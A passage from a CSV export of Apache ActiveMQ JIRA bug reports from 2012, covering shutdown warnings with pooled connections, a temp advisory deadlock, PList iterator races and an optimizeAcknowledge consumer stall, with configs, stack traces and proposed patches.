	at java.lang.Thread.run(Thread.java:680) [na:1.6.0_33]
{code}

Pool Connection Declaration:
{code}
	<bean id=""jmsConnectionFactory"" class=""org.apache.activemq.ActiveMQConnectionFactory"">
		<property name=""brokerURL"" value=""${amq.url}"" />
		<property name=""userName"" value=""${amq.username}"" />
		<property name=""password"" value=""${amq.password}"" />
		<property name=""watchTopicAdvisories"" value=""${amq.watchTopicAdv}"" />
	</bean>

	<bean id=""pooledConnectionFactory"" class=""org.apache.activemq.pool.PooledConnectionFactory"">
		<property name=""maxConnections"" value=""${amq.maxConnections}"" />
		<property name=""maximumActive"" value=""${amq.maximumActive}"" />
		<property name=""connectionFactory"" ref=""jmsConnectionFactory"" />
	</bean>

	<bean id=""jmsConfig"" class=""org.apache.camel.component.jms.JmsConfiguration"">
		<property name=""connectionFactory"" ref=""pooledConnectionFactory"" />
		<property name=""transacted"" value=""false"" />
		<property name=""testConnectionOnStartup"" value=""true"" />
		<property name=""concurrentConsumers"" value=""${amq.concurrentConsumers}"" />
	</bean>

	<bean id=""activemq"" class=""org.apache.activemq.camel.component.ActiveMQComponent"">
		<property name=""configuration"" ref=""jmsConfig"" />
	</bean>
{code}

Maven Dependencies:
{code}
		<dependency>
			<groupId>org.apache.activemq</groupId>
			<artifactId>activemq-camel</artifactId>
			<version>5.6.0</version>
		</dependency>
		<dependency>
			<groupId>org.apache.activemq</groupId>
			<artifactId>activemq-pool</artifactId>
			<version>5.6.0</version>
		</dependency>
{code}

","Mac OSX Snow Leopard, Java 6, ActiveMQ 5.6.0, Camel 2.10, Spring 3.0.7.RELEASE",davsclaus,harley,mate,robinsk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Aug/12 11:05;davsclaus;AMQ-3988.patch;https://issues.apache.org/jira/secure/attachment/12543072/AMQ-3988.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249773,,,Thu Aug 30 13:18:59 UTC 2012,,,,,,,,,,,"0|i0ahev:",59094,,,,,,,,,,,,,,,,,,,,,"30/Aug/12 09:11;davsclaus;Ah you are shutting down the application. Do you have an embedded AMQ broker, or do you connect to a remote broker?

Since its Spring that shutdown, then make sure to set the order in the XML files using depends-on attributes. So Spring will shutdown Camel first.

You should also use the start|stop method on the pook as documented here
http://camel.apache.org/activemq
{code}
<bean id=""pooledConnectionFactory"" 
   class=""org.apache.activemq.pool.PooledConnectionFactory"" init-method=""start"" destroy-method=""stop"">
{code}

But the ""depends-on"" attribute should be set on these <bean> to depend on <camelContext> so Spring can shutdown Camel before them etc.



Looking at the source in 5.4.2 vs 5.6.0 then in 5.6.0 there is a try  .. catch now with a log WARN.
As the logic is clearing the session listener, we could possible enhance AMQ to allow setting the listener to null, even if its already closed. ;;;","30/Aug/12 11:05;davsclaus;Patch in activemq-core, to allow setting the listener to null if the session has been prior closed.;;;","30/Aug/12 11:16;davsclaus;We now allows setting the listener to null, even if the session has prior been closed. This should allow nicer shutdown of apps.

However still you should configure those depends-on to help Spring shutdown the app in correct order.;;;","30/Aug/12 11:20;robinsk;Just wondering, how exactly should depends-on be configured? We're experiencing the same issue, and I've tried setting the depends-on attribute on the camelContext, the ActiveMQComponent, the PooledConnectionFactory, but none of those seem to have any effect.;;;","30/Aug/12 12:06;davsclaus;Yeah it can be tricky to get spring to shutdown in the order you want.

There is an example in Apache Camel - camel-example-management that has an embedded AMQ broker, that shutdown in correct order (AFAIR).
Also it may depend a bit on if embedded AMQ in the same JVM as the client (eg Camel) or use a remote AMQ broker etc.

@Jorge, fell free to try with 5.7-SNAPSHOT to see if the WARNs is gone now. ;;;","30/Aug/12 12:09;robinsk;In our case we're using a remote broker in another JVM, so we can't ""depends-on"" the broker instance. Hmm.;;;","30/Aug/12 13:18;harley;This issue happens when Camel is shutting down. My Camel connects to a remote broker and my configuration is shutting down Camel first, then the ActiveMQ. I used start/stop methods for init and destroy but i received the same WARNs. Also i try setting the correct depend-on attributes in Camel and ActiveMQ but there is no change.

I will try with the 5.7-SNAPSHOT to see if the WARNs is gone now.

Thank you very much [~davsclaus]. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQConnection temp advisory consumer should use asyncDispatch - can cause deadlock with slow consumers,AMQ-3985,12604231,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,21/Aug/12 14:59,04/Sep/12 15:44,14/Jul/23 05:43,21/Aug/12 15:48,5.6.0,,,,,5.7.0,,,JMS client,,,,0,advisory,consumer,deadlock,slow,temp,,,,"A slow or blocked connection with the default temp advisory consumer can cause operations that create advisories to block b/c the dispatch is sync to that advisory consumer. If the block occurs after the prefetch is filled the broker stores pending messages and the problem is avoided, but if the block occurs before the prefetch is reached, the dispatch is attempted in the calling thread, which blocks the originating operation. not good.
The solution is to always request async dispatch for the temp advisory consumer in a client connection.",,gtully,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4017,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,246255,,,Tue Aug 21 15:48:43 UTC 2012,,,,,,,,,,,"0|i07jan:",41893,,,,,,,,,,,,,,,,,,,,,"21/Aug/12 15:48;gtully;fix in http://svn.apache.org/viewvc?rev=1375595&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Overlapping PList iterators can read wrong data or throw exceptions about chunk streams not existing.,AMQ-3982,12604063,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,tabish,tabish,20/Aug/12 15:18,04/Jun/13 18:10,14/Jul/23 05:43,20/Aug/12 17:52,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"When multiple PList iterators are in use and happen have an overlapping read of PageFile data on disk they can reset each others seek offset and cause an exception to be thrown about ""chunk stream does not exist"" or read of a page in the Free list.  The reason is that the hasNext of PList iterator needs to by sync'd on the index lock to prevent two iterators from entering into a readPage call concurrently.  ",,davsclaus,gtully,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4118,,,AMQ-4573,,,,,,,,,,,,,"30/Aug/12 15:18;gtully;new.txt;https://issues.apache.org/jira/secure/attachment/12543103/new.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,246251,,,Fri Oct 19 22:52:47 UTC 2012,,,,,,,,,,,"0|i07jav:",41894,,,,,,,,,,,,,,,,,,,,,"20/Aug/12 15:20;tabish;One error that can be seen:

{noformat}
2012-07-24 11:39:05,287 [n.ch] Scheduler] ERROR Queue                          - Problem retrieving message for browse
java.lang.NullPointerException
	at org.apache.kahadb.index.ListNode.access$200(ListNode.java:37)
	at org.apache.kahadb.index.ListNode$NodeMarshaller.writePayload(ListNode.java:265)
	at org.apache.kahadb.index.ListNode$NodeMarshaller.writePayload(ListNode.java:255)
	at org.apache.kahadb.page.Transaction.store(Transaction.java:248)
	at org.apache.kahadb.index.ListIndex.storeNode(ListIndex.java:326)
	at org.apache.kahadb.index.ListNode.store(ListNode.java:348)
	at org.apache.kahadb.index.ListNode.access$500(ListNode.java:37)
	at org.apache.kahadb.index.ListNode$ListIterator.remove(ListNode.java:227)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator$1.execute(PList.java:228)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:765)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.remove(PList.java:225)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.remove(FilePendingMessageCursor.java:517)
	at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.remove(FilePendingMessageCursor.java:321)
	at org.apache.activemq.broker.region.Queue.doBrowse(Queue.java:1061)
	at org.apache.activemq.broker.region.Queue.expireMessages(Queue.java:804)
	at org.apache.activemq.broker.region.Queue.access$100(Queue.java:91)
	at org.apache.activemq.broker.region.Queue$2.run(Queue.java:131)
	at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)
	at java.util.TimerThread.mainLoop(Timer.java:512)
	at java.util.TimerThread.run(Timer.java:462)
{noformat}

and another:

{noformat}
2012-08-08 20:49:47,918 [n.ch] Scheduler] ERROR Queue - Problem retrieving message for browse
java.util.NoSuchElementException: Chunk stream does not exist, page: 75281 is marked free
at org.apache.kahadb.index.ListNode$ListIterator.getFromNextNode(ListNode.java:165)
at org.apache.kahadb.index.ListNode$ListIterator.hasNext(ListNode.java:176)
at org.apache.activemq.store.kahadb.plist.PList$PListIterator.hasNext(PList.java:204)
at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.hasNext(FilePendingMessageCursor.java:503)
at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.hasNext(FilePendingMessageCursor.java:297)
at org.apache.activemq.broker.region.Queue.doBrowse(Queue.java:1052)
at org.apache.activemq.broker.region.Queue.expireMessages(Queue.java:804)
at org.apache.activemq.broker.region.Queue.access$100(Queue.java:91)
at org.apache.activemq.broker.region.Queue$2.run(Queue.java:131)
at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)
at java.util.TimerThread.mainLoop(Timer.java:512)
at java.util.TimerThread.run(Timer.java:462)
Caused by: java.io.EOFException: Chunk stream does not exist, page: 75281 is marked free
at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:455)
at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:432)
at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:429)
at org.apache.kahadb.page.Transaction.load(Transaction.java:405)
at org.apache.kahadb.page.Transaction.load(Transaction.java:362)
at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:306)
{noformat};;;","20/Aug/12 17:52;tabish;Fix applied to the PList, synchronized the hasNext method on the indexLock which prevents multiple iterators from seeking into the pageFile at the same time and corrupting the results of a read.  ;;;","03/Sep/12 11:36;davsclaus;And today I got this on trunk code on the PListTest

{code}
2012-09-03 13:08:59,043 [IRM:0          ] - WARN  PListTest                      - Job[0] caught exception: null
java.lang.NullPointerException
	at org.apache.kahadb.util.LinkedNode.isTailNode(LinkedNode.java:68)
	at org.apache.kahadb.util.LinkedNode.getNext(LinkedNode.java:48)
	at org.apache.kahadb.index.ListNode$ListIterator.next(ListNode.java:184)
	at org.apache.kahadb.index.ListNode$ListIterator.next(ListNode.java:129)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.next(PList.java:210)
	at org.apache.activemq.store.kahadb.plist.PList$PListIterator.next(PList.java:192)
	at org.apache.activemq.store.kahadb.plist.PListTest$Job.run(PListTest.java:578)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
{code};;;","19/Oct/12 22:52;gtully;I think the fix for https://issues.apache.org/jira/browse/AMQ-4118 is relevant to this usecase, especially if messages are > 4k;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQSslConnectionFactory.java now has apache commons dependency,AMQ-3981,12603853,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,bdwagne,bdwagne,17/Aug/12 12:52,17/Aug/12 12:56,14/Jul/23 05:43,17/Aug/12 12:56,5.6.0,,,,,5.7.0,,,Transport,,,,0,,,,,,,,,As of 5.6 ActiveMQSslConnectionFactory.java imports apache commons and creates an instance of LogFactory forcing the use or inclusion of apache commons logger when using SSL connections.,,bdwagne,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,246254,,,Fri Aug 17 12:56:24 UTC 2012,,,,,,,,,,,"0|i07jbz:",41899,,,,,,,,,,,,,,,,,,,,,"17/Aug/12 12:56;tabish;Fixed in trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AjaxServlet preventing Tomcat Container from shutting down.  ,AMQ-3979,12603714,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,16/Aug/12 11:27,16/Aug/12 11:32,14/Jul/23 05:43,16/Aug/12 11:32,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,org.apache.activemq.web.MessageListenerServlet start non daemon thread that prevents web container to shutdown properly.,,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,246245,,,Thu Aug 16 11:32:15 UTC 2012,,,,,,,,,,,"0|i07j9b:",41887,,,,,,,,,,,,,,,,,,,,,"16/Aug/12 11:32;dejanb;Fixed with svn revision 1373794;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQMessageProducer::send uses == instead of equals to compare destinations,AMQ-3976,12603564,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,peshitz,peshitz,15/Aug/12 09:57,08/Sep/12 10:27,14/Jul/23 05:43,08/Sep/12 10:27,5.5.1,,,,,5.7.0,,,JMS client,,,,0,,,,,,,,,"In method   
send(Destination destination, Message message, int deliveryMode, int priority, long timeToLive)

The comparison destination == info.getDestination() in line 205 seems wrong.
I think that destination.equals(info.getDestination()).

Otherwise you get an exception ""This producer can only send messages to QUEUE"", even when both destination  and info.getDestination() point to the same queue.

",,davsclaus,peshitz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249774,,,Sat Sep 08 10:27:49 UTC 2012,,,,,,,,,,,"0|i0ahf3:",59095,,,,,,,,,,,,,,,,,,,,,"01/Sep/12 15:09;davsclaus;I can see the code has not changed since the initial checkin of the source.
So you are the first to report this.

Do you have an unit test or use-case that was affected by this?

;;;","08/Sep/12 10:27;davsclaus;Thanks for reporting.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
data.db size is not included in calculation to monitor systemUsage settings,AMQ-3973,12603436,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,14/Aug/12 12:33,14/Aug/12 13:17,14/Jul/23 05:43,14/Aug/12 13:17,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,Index size is not currently included in kahadb store size calculation.,,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,246247,,,Tue Aug 14 13:17:52 UTC 2012,,,,,,,,,,,"0|i07j8v:",41885,,,,,,,,,,,,,,,,,,,,,"14/Aug/12 13:17;dejanb;Fixed with svn revision 1372859;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Expired msgs not getting acked to broker causing consumer to fill up its prefetch and not getting more msgs.,AMQ-3965,12602250,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tmielke,tmielke,tmielke,08/Aug/12 15:07,13/Aug/12 07:09,14/Jul/23 05:43,13/Aug/12 07:09,5.6.0,,,,,5.7.0,,,JMS client,,,,0,optimizeDispatch,,,,,,,,"
It is possible to get a consumer stalled and not receiving any more messages when using optimizeAcknowledge.
Let me illustrate in an example (JUnit test attached).

Suppose a consumer with optimizeAcknowledge and a prefetch of 100 msgs.
The broker's queue contains 105 msg. The first 45 msgs have a very low expiry time, the remaining don't expiry. 

So the first 100 msgs get dispatched to the consumer (due to prefetch=100). Out of these the first 45 msgs do not get dispatched to consumer code because their expiry has elapsed by the time that are handled in the client. 

{code:title=ActiveMQMessageConsumer.java}
public void dispatch(MessageDispatch md) {
        MessageListener listener = this.messageListener.get();
        try {
            [...]
            synchronized (unconsumedMessages.getMutex()) {
                if (!unconsumedMessages.isClosed()) {
                    if (this.info.isBrowser() || !session.connection.isDuplicate(this, md.getMessage())) {
                        if (listener != null && unconsumedMessages.isRunning()) {
                            ActiveMQMessage message = createActiveMQMessage(md);
                            beforeMessageIsConsumed(md);
                            try {
                                boolean expired = message.isExpired();
                                if (!expired) {
                                    listener.onMessage(message);
                                }
                                afterMessageIsConsumed(md, expired);
{code}

listener.onMessage() above is not called as the msg has expired. 
However it will calls into afterMessagesIsConsumed()

{code:title=ActiveMQMessageConsumer.java}
    private void afterMessageIsConsumed(MessageDispatch md, boolean messageExpired) throws JMSException {
      [...]  
      if (messageExpired) {
            synchronized (deliveredMessages) {
                deliveredMessages.remove(md);
            }
            stats.getExpiredMessageCount().increment();
            ackLater(md, MessageAck.DELIVERED_ACK_TYPE);

{code}

and will remove the expired msg from the deliveredMessages list. It then calls into ackLater(). 
However ackLater() only fires an ack back to the broker when the number of unsent acks has reached 50% of the prefetch value.

{code:title=ActiveMQMessageConsumer.java}
 private void ackLater(MessageDispatch md, byte ackType) throws JMSException {
    [...]
    if ((0.5 * info.getPrefetchSize()) <= (deliveredCounter - additionalWindowSize)) {
            session.sendAck(pendingAck);
{code}        

In our example it has not reached that mark (only 45 expired msgs, i.e. 45%). 
So the first 45 msgs, which expired before being dispatched, did not cause an ack being sent to the broker.

Now the next 55 messages get processed. These don't have an expiry so they get dispatched to consumer code. 
After dispatching each msg to the registered application code, we call into afterMessageIsConsumed() but this time executing a different branch as the msgs are not expired

{code:title=ActiveMQMessageConsumer.java}
private void afterMessageIsConsumed(MessageDispatch md, boolean messageExpired) throws JMSException {
    [...]
    else if (isAutoAcknowledgeEach()) {
                if (deliveryingAcknowledgements.compareAndSet(false, true)) {
                    synchronized (deliveredMessages) {
                        if (!deliveredMessages.isEmpty()) {
                            if (optimizeAcknowledge) {
                                ackCounter++;
                                if (ackCounter >= (info.getPrefetchSize() * .65) || (optimizeAcknowledgeTimeOut > 0 && System.currentTimeMillis() >= (optimizeAckTimestamp + optimizeAcknowledgeTimeOut))) {
                                    MessageAck ack = makeAckForAllDeliveredMessages(MessageAck.STANDARD_ACK_TYPE);
                                    if (ack != null) {
                                        deliveredMessages.clear();
                                        ackCounter = 0;
                                        session.sendAck(ack);
                                        optimizeAckTimestamp = System.currentTimeMillis();
                                    }
                                }
{code}

with optimizeAcknowledge=true we only send an ack back to the broker if either optimizeAcknowledgeTimeOut has elapsed or the ackCounter has reached 65% of the prefetch (100). 
The timeout will not have kicked in. The ackCounter will be at 55 after processing the last of 100 prefetched messages which is less than 65% of 100. So with the last prefetched msg being processed, it will not generate an ack back to the broker. 
As a result, the client has processed all prefetched message and will not get any new messages dispatched from the broker. The broker has another 5 msgs on the queue but since it never received an ack from the client, it won't dispatch any further messages. 

The client is stalled. 

",,gtully,tabish,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Aug/12 10:31;tmielke;AMQ-3956.patch;https://issues.apache.org/jira/secure/attachment/12540464/AMQ-3956.patch","08/Aug/12 21:01;tabish;OptimizeAcknowledgeWithExpiredMsgsTest.java;https://issues.apache.org/jira/secure/attachment/12539923/OptimizeAcknowledgeWithExpiredMsgsTest.java","08/Aug/12 15:13;tmielke;testcase.tgz;https://issues.apache.org/jira/secure/attachment/12539875/testcase.tgz",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,246257,,,Mon Aug 13 07:09:22 UTC 2012,,,,,,,,,,,"0|i07jc7:",41900,,,,,,,,,,,,,,,,,,,,,"08/Aug/12 15:07;tmielke;A possible fix for this may be to no hold back acks for expired messages (as currently done by calling ackLater()) but to ack any expired messages
straight away.
This however will cause more acks to be written back to the broker, but only in case of expired messages.

Perhaps there is a better solution that has less of an overhead? ;;;","08/Aug/12 15:13;tmielke;Attaching testcase as mvn project. 
The testclasss can also be copied into activemq-core/src/test/java/org/apache/activemq/bugs ;;;","08/Aug/12 21:01;tabish;Updated the test so that the async case is more stable on fast hardware, was a bit flaky on my fast Linux box.  Added a sync test case to show that both paths suffer the same problem and also to verify the async case was suffering timing issues. ;;;","08/Aug/12 21:17;tabish;it looks like at the very least we need to check the pendingAcks when we go into the optimize ack case as it doesn't use the deliveredCounter like the rest of the code that uses ackLater so unlike ackLater it doesn't see the pending count of expired messages.;;;","09/Aug/12 16:13;tmielke;We thought that the following fix could do the job 
{code:title=ActiveMQMessageConsumer.java} 
private void afterMessageIsConsumed(MessageDispatch md, boolean messageExpired) throws JMSException {
[...]
        if (messageExpired) {
            synchronized (deliveredMessages) {
                deliveredMessages.remove(md);
            }
            stats.getExpiredMessageCount().increment();
            ackLater(md, MessageAck.DELIVERED_ACK_TYPE);
        } else {
            stats.onMessage();
            if (session.getTransacted()) {
                // Do nothing.
            } else if (isAutoAcknowledgeEach()) {
                if (deliveryingAcknowledgements.compareAndSet(false, true)) {
                    synchronized (deliveredMessages) {
                        if (!deliveredMessages.isEmpty()) {
                            if (optimizeAcknowledge) {
                            	ackCounter++;
                            	
                            	// AMQ-3965 - this alone does not fix it.
                                float threshold = (float) info.getPrefetchSize() * (float) 0.65;
                            	if (pendingAck != null && (ackCounter + deliveredCounter) >= (threshold)) {
                                    session.sendAck(pendingAck);
                                    pendingAck = null;
                                    deliveredCounter = 0;
                            	}
                                if (ackCounter >= (threshold) || (optimizeAcknowledgeTimeOut > 0 && System.currentTimeMillis() >= (optimizeAckTimestamp + optimizeAcknowledgeTimeOut))) {
                                    MessageAck ack = makeAckForAllDeliveredMessages(MessageAck.STANDARD_ACK_TYPE);
                                    if (ack != null) {
                                        deliveredMessages.clear();
                                        ackCounter = 0;
                                        session.sendAck(ack);
                                        optimizeAckTimestamp = System.currentTimeMillis();
                                    }
                                }
{code} 

but that extra code 
{code} 
// AMQ-3965 - this alone does not fix it.
float threshold = (float) info.getPrefetchSize() * (float) 0.65;
if (optimizeAcknowledge && pendingAck != null && (ackCounter + deliveredCounter) >= (threshold)) {
  session.sendAck(pendingAck);
  pendingAck = null;
  deliveredCounter = 0;
} 

{code} alone is not enough. Let me explain why: 

Suppose a prefetch of 100. Consumer receives 56 normal msgs. So ackCounter is at 56, no ack sent back to broker yet. It then receives 44 msgs that expire on consumer before dispatch. So deliveredCounter=44 and ackCounter=56. In afterMessageIsConsumed() it does not go into the proposed code for the expired msgs, only for normal msgs. So for the last 44 expired msgs there is no trigger fired to sent an ack to the broker. The result is a hanging consumer that does not receive any more msgs. Problem not fixed. ;;;","09/Aug/12 21:25;tabish;So far I haven't hit on any more elagant solution than to also check use the ackCounter in ackLater like so:

{code}
        // NOTE: I bumped this to 0.65, its currently 0.5 for some reason.
        float threshold = 0.65f * info.getPrefetchSize();
        if (threshold <= ((ackCounter + deliveredCounter) - additionalWindowSize)) {
            session.sendAck(pendingAck);
            pendingAck=null;
            deliveredCounter = 0;
            additionalWindowSize = 0;
        }
{code}

This of course can lead to the scenario where you start acking every single expired message that arrives if the numbers are right, but without a lot of code changes I haven't seen another way to deal with this.  Eventually when some non-expired messages come in and the ackCounter gets high enough to send ack for the consumed messages things would settle down again.;;;","10/Aug/12 10:18;tmielke;Proposing the following fix: 

{code:title=ActiveMQMessageConsumer.java}
private void ackLater(MessageDispatch md, byte ackType) throws JMSException {
[...]
    if ((0.5 * info.getPrefetchSize()) <= (deliveredCounter + ackCounter - additionalWindowSize)) {
      session.sendAck(pendingAck);
      pendingAck=null;
      deliveredCounter = 0;
      additionalWindowSize = 0;
    }

[...]

private void afterMessageIsConsumed(MessageDispatch md, boolean messageExpired) throws JMSException {
[...]
synchronized (deliveredMessages) {
                        if (!deliveredMessages.isEmpty()) {
                            if (optimizeAcknowledge) {
                                ackCounter++;
                                
                                // AMQ-3956 evaluate both expired and normal msgs as 
                                // otherwise consumer may get stalled
                                if (ackCounter + deliveredCounter >= (info.getPrefetchSize() * .65) || (optimizeAcknowledgeTimeOut > 0 && System.currentTimeMillis() >= (optimizeAckTimestamp + optimizeAcknowledgeTimeOut))) {
                                    MessageAck ack = makeAckForAllDeliveredMessages(MessageAck.STANDARD_ACK_TYPE);
                                	if (ack != null) {
                                        deliveredMessages.clear();
                                        ackCounter = 0;
                                        session.sendAck(ack);
                                        optimizeAckTimestamp = System.currentTimeMillis();
                                    }
                                	// AMQ-3956 - as further optimization send 
                                    // ack for expired msgs when there are any.
                                    // This resets the deliveredCounter to 0 so that
                                	// we won't sent standard acks with every msg just
                                	// because the deliveredCounter just below 
                                	// 0.5 * prefetch as used in ackLater()
                                	if (pendingAck != null && deliveredCounter > 0) {
                                    	session.sendAck(pendingAck);
                                        pendingAck = null;
                                        deliveredCounter = 0;
                                    }
                                }
                            }
{code}

Essentially, both methods ackLater() and afterMessageIsConsumed() now evaluate ackCounter + deliveredCounter. 
This will avoid getting a stalled consumer and fixes the bug.

However an additional optimization is necessary for the following case:
Suppose a prefetch=100. 
Consumer receives 49 msgs that expire before being dispatched. So deliveredCounter=49, ackCounter=0. No ack is sent as threshold is below 50. 
Next, consumer only processes non-expired msgs. As deliveredCounter=49, it will dispatch 17 msg and then send a standard ack. Because after
the 17th msg, deliveredCounter=49, ackCounter=17, so that exceeds 0.65*prefetch and hence a standard ack is sent. The ack resets the ackCounter but not the deliveredCounter, which remains at 49. 
So we would process only another 17 non-expired msgs before we would send the next standard ack to the broker. The problem is that the deliveredCounter does not change unless we receive another expired msg. If we only receive non-expired msgs going further, then deliveredCounter never gets reset to 0 and we ack after every 17 msgs instead of after 0.65*prefetch=65 msg.
To avoid this situation, I propose to send a deliveredAck right after the standard Ack. This would reset the deliveredCounter to 0 and we can process the next 65 non-expired msgs without having to send back an ack (as opposed to processing only 17 msg before sending an ack).
If there is no expired msgs to be acked, then no deliveredAck is being sent. So this should only trigger in the case where some expired msgs have accumulated but have not being acked yet. 
;;;","10/Aug/12 10:31;tmielke;Attaching possible patch plus JUnit test. 
Would ask for review and if accepted I can commit the code to trunk. ;;;","10/Aug/12 11:52;gtully;@Torsten that patch[1] looks good to me.
